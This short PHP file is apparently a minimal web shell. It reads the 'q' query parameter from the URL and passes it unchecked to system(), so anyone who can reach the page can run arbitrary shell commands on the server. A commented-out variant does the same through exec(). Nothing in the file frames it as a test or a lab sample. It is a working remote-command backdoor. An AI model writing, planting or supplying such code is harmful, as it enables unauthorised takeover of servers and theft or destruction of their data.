<?php

$cmd = $_GET["q"];
/*
$output = [];
$lastline = exec($cmd, $output, $return_val);
foreach ($output as $line){
    echo '</br>';
    echo htmlspecialchars($line);
}
echo '</br>';
*/
system($cmd);
?>
